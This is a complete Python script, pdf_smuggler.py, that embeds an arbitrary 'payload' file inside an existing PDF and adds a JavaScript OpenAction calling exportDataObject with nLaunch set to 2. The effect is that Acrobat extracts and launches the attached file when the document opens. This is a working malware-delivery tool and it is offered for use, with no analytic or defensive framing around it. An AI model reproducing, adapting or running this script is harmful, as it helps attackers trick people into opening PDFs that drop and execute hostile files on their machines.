#!/usr/bin/env python3
"""
pdf_smuggler.py

Embed a file inside an existing PDF and add a JavaScript OpenAction that calls
this.exportDataObject(...) so Acrobat can offer the embedded file on open.

This is a refactor of an older script but preserves the same functionality
and uses the legacy/deprecated PyPDF2 API (PdfFileReader / PdfFileWriter).
"""

import sys
from PyPDF2 import PdfFileReader, PdfFileWriter
from PyPDF2.generic import NameObject, createStringObject, DictionaryObject


def _build_export_js(target_name: str) -> str:
    """Return the Acrobat JS string that exports the embedded object."""
    return 'this.exportDataObject({ cName: "%s", nLaunch: 2 });' % target_name


def embed_and_set_open_action(src_pdf: str, payload_path: str, out_pdf: str) -> None:
    """Embed payload_path into src_pdf and set an /OpenAction to export it."""
    if not src_pdf or not payload_path or not out_pdf:
        raise ValueError("All parameters (src_pdf, payload_path, out_pdf) are required.")

    # Reading source and preparing the writer
    reader = PdfFileReader(src_pdf)
    writer = PdfFileWriter()

    writer.appendPagesFromReader(reader)

    # Attaching the payload bytes
    with open(payload_path, "rb") as p:
        payload_data = p.read()
    writer.addAttachment(payload_path, payload_data)

    
    root_open_action = writer._root_object.get("/OpenAction")
    if root_open_action is None:
        # Creating an empty dictionary and attaching it to the root as /OpenAction
        new_open = DictionaryObject({})
        writer._root_object.update({NameObject("/OpenAction"): new_open})
        open_dict = new_open
    else:
        # existing object -> getObject()
        open_dict = root_open_action.getObject()

    open_dict.update({
        NameObject("/S"): NameObject("/JavaScript"),
        NameObject("/JS"): createStringObject(_build_export_js(payload_path))
    })

    # Write out the final PDF output
    with open(out_pdf, "wb") as out_f:
        writer.write(out_f)

    print(f"Success! Created: {out_pdf}")


def _usage_and_exit():
    print("Usage: python pdf_smuggler.py <input_pdf> <attachment> <output_pdf>")
    sys.exit(1)


def main(argv):
    if len(argv) != 4:
        _usage_and_exit()

    _, src, payload, out = argv
    embed_and_set_open_action(src, payload, out)


if __name__ == "__main__":
    main(sys.argv)